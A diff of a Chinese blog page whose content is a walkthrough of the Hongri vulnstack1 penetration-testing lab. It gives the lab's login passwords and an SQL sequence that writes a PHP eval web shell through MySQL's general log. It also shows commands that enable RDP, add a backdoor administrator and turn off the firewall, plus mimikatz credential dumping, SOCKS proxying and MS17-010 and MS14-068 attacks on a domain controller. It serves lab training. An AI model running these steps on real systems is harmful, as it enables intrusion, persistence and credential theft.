@@ -50,7 +50,7 @@
 <meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11321603-7372efd0f7e113ea.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
 <meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11321603-bdd631fd39246e26.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
 <meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11321603-c815f1c9aad199c4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:updated_time" content="2020-01-13T07:43:50.287Z">
+<meta property="og:updated_time" content="2020-01-13T08:21:26.700Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="红日安全靶场vulnstack1过程文档">
 <meta name="twitter:description" content="靶场连接：http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">
@@ -214,7 +214,7 @@
 <a id="more"></a>
 <p> 前期靶场环境搭建</p>
 <p>下载链接： <a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/" target="_blank" rel="noopener">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a> </p>
-<h4 id="环境拓扑"><a href="#环境拓扑" class="headerlink" title="环境拓扑"></a>环境拓扑</h4><p><img src="https://upload-images.jianshu.io/upload_images/11321603-f4b1b553290bdd33.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<h4 id="环境拓扑"><a href="#环境拓扑" class="headerlink" title="环境拓扑"></a>环境拓扑</h4><p><img src="https://upload-images.jianshu.io/upload_images/11321603-f4b1b553290bdd33.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <h4 id="环境简介-三者均为-同一个域内"><a href="#环境简介-三者均为-同一个域内" class="headerlink" title="环境简介(三者均为 同一个域内)"></a>环境简介(三者均为 同一个域内)</h4><p>VM1:</p>
 <p>Web服务器，域成员1(WIN7——192.168.52.143)</p>
 <p>登录密码：hongrisec@2019 </p>
@@ -224,78 +224,78 @@
 <p>VM3:</p>
 <p>域控(WIN SERVER08——192.168.52.138)</p>
 <p>登录密码：LZXlzx123</p>
-<h3 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h3><h4 id="渗透web服务器"><a href="#渗透web服务器" class="headerlink" title="渗透web服务器"></a>渗透web服务器</h4><p><img src="https://upload-images.jianshu.io/upload_images/11321603-5000d6a46f865efb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<h3 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h3><h4 id="渗透web服务器"><a href="#渗透web服务器" class="headerlink" title="渗透web服务器"></a>渗透web服务器</h4><p><img src="https://upload-images.jianshu.io/upload_images/11321603-5000d6a46f865efb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <p>发现有phpmyadmin,尝试发现弱口令root\root,发现mysql版本为5.5.53</p>
 <p>直接上一波UDF,参考 <a href="https://www.freebuf.com/articles/system/163144.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/163144.html</a> </p>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-afff9593518d3050.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-afff9593518d3050.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <p>得到路径C:\phpStudy\MySQL\lib\plugin\</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-59251e72810496fa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-0f70d12f16fe98c7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-59251e72810496fa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-0f70d12f16fe98c7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <p>发现secure_file_priv的值为null ，表示限制mysqld 不允许导入|导出 ——UDF失败</p>
 <p>尝试开启全局日志getshell </p>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-0e575c7a28167545.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-0e575c7a28167545.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">set global general_log=on;# 开启日志</span><br><span class="line"></span><br><span class="line">set global general_log_file=&apos;C:/phpstudy/www/phpinfo.php&apos;;# 设置日志位置</span><br><span class="line"></span><br><span class="line">SELECT &apos;&lt;?php eval($_POST[&quot;obolu&quot;]); ?&gt;&apos;</span><br></pre></td></tr></table></figure>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-a7157095fd00d71f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-a7157095fd00d71f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <p>实际日志会记录进该文件里，直接菜刀连接</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-f3bace61ffade686.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-f3bace61ffade686.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <p>发现是administrator权限，常用命令</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">开3389:</span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br><span class="line">添加用户：</span><br><span class="line">net user obolu LZXlzx123 /add</span><br><span class="line">用户加管理组：</span><br><span class="line">net localgroup administrators obolu /add</span><br><span class="line">关墙：netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-c51010c755a3b9f2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-c51010c755a3b9f2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <p>账户创建完毕，发现3389连接成功</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-af02377a213cd057.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-af02377a213cd057.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">常用内网命令：</span><br><span class="line">1.net user /domain    查询域用户</span><br><span class="line">2.arp -a 查看arp表</span><br><span class="line">3.net user /domain admin pass    修改域内用户密码，需要管理员权限</span><br></pre></td></tr></table></figure>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-2c0c4e8dbe91eea9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-2c0c4e8dbe91eea9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <p>发现138和141，ping一下发现存活，NMAP收集一波资产。</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-ccec22f0e31bbe22.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-fc56f805a80d1921.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-56d9242e3493a1a9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-e713e5e3ef62a29f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-ccec22f0e31bbe22.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-fc56f805a80d1921.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-56d9242e3493a1a9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-e713e5e3ef62a29f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <h4 id="渗透内网"><a href="#渗透内网" class="headerlink" title="渗透内网"></a>渗透内网</h4><p>目标：</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-d6248b3b0025bcf8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-d6248b3b0025bcf8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <p>192.168.52.138(winserver08/owa)</p>
 <p>192.168.52.141(winserver03/root-tvi862ubeh)</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-94576e0160b6af8c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-94576e0160b6af8c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <p>结合DNS服务器判断，08是域控，03是域成员2</p>
 <p>目前思路：</p>
 <h5 id="1-抓win7管理密码"><a href="#1-抓win7管理密码" class="headerlink" title="1.抓win7管理密码"></a>1.抓win7管理密码</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">上传mimikatz</span><br><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-da596329541fcad1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-da596329541fcad1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <p>抓到administrator密码。</p>
-<h5 id="2-win7开代理"><a href="#2-win7开代理" class="headerlink" title="2.win7开代理"></a>2.win7开代理</h5><h6 id="思路1：kali上msf"><a href="#思路1：kali上msf" class="headerlink" title="思路1：kali上msf"></a>思路1：kali上msf</h6><p><img src="https://upload-images.jianshu.io/upload_images/11321603-e7b7f83c39eeb162.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<h5 id="2-win7开代理"><a href="#2-win7开代理" class="headerlink" title="2.win7开代理"></a>2.win7开代理</h5><h6 id="思路1：kali上msf"><a href="#思路1：kali上msf" class="headerlink" title="思路1：kali上msf"></a>思路1：kali上msf</h6><p><img src="https://upload-images.jianshu.io/upload_images/11321603-e7b7f83c39eeb162.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <p>扫描发现17-010都有，EW开波代理</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">权限足够，开个正向的</span><br><span class="line">ew_for_Win.exe -s ssocksd -l 1080</span><br><span class="line">Kali客户端用的ProxyChains</span><br><span class="line">配置如下：</span><br></pre></td></tr></table></figure>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-689549d69ddfb81d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-689549d69ddfb81d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <p>测试代理是否开成了，不用代理扫不到洞(可能因为有域墙)，开代理后能扫到</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-df690cc9688003a3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-df690cc9688003a3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <p>使用msf的scanner也可以扫到。exploit一下…..这里犯了个错误….走代理流量的msf，没法反弹shell回来。(猜测是反向没法找到kali的地址)</p>
 <p>使用cmd模块</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-2d0eac02e3c26179.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-2d0eac02e3c26179.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <p>一看权限system</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-12671f93f42e7591.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-12671f93f42e7591.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <p>新建账号开3389链接一下</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">查看我是什么权限：whoami</span><br><span class="line">开3389:</span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br><span class="line">添加用户：</span><br><span class="line">net user obolu LZXlzx123 /add</span><br><span class="line">用户加管理组：</span><br><span class="line">net localgroup administrators obolu /add</span><br><span class="line">关墙：netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-7d25df5b31e58178.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-7d25df5b31e58178.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <p>这时可以在win7上再开一个rdp，但是发现链接失败….msf好像会删除对命令中的\和双引号，3389失败</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-81332af6732e2d41.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-81332af6732e2d41.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <p>尝试psexec模块….也失败了。</p>
 <p>重新卡住….经过大佬的一番指点，使用powershell编码一下</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-4f00a534294382e1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-4f00a534294382e1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <p>成功开启3389，传mimikatz即可抓账户。但是两层的RDP会慢的一批。</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-6421f9142f2507e2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-6421f9142f2507e2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <h6 id="思路2：MS14-068"><a href="#思路2：MS14-068" class="headerlink" title="思路2：MS14-068"></a>思路2：MS14-068</h6><p>查一下域控是否安装补丁</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-baa09dbce7e9722d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-baa09dbce7e9722d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <p>systeminfo发现未安装KB3011780，由于已经拥有win7的域用户，RDP登录一下。</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-8f84ddb93a22cd99.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-8f84ddb93a22cd99.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <p>记录SID值。并通过EXP生成.ccache文件</p>
 <p>S-1-5-21-2952760202-1353902439-2381784089-500</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-f4919fd7273abdff.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-f4919fd7273abdff.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <p>将生成的票据注入内存。</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-5aa4afffc44fafc5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-5aa4afffc44fafc5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <p>重启登录，发现磁盘可以读取</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-7372efd0f7e113ea.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-7372efd0f7e113ea.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <p>为了看出区别….特意去域控上面新建了一个obolu_test文件夹</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-bdd631fd39246e26.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-bdd631fd39246e26.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <p>接下来尝试登陆。</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-c815f1c9aad199c4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-c815f1c9aad199c4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <p>发现成功登录</p>
 
       
@@ -553,11 +553,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">web学习</a>
+                <a href="javascript:void(0)" class="js-tag color5">知识收藏</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">知识收藏</a>
+                <a href="javascript:void(0)" class="js-tag color1">web学习</a>
               </li>
              
               <li class="article-tag-list-item">
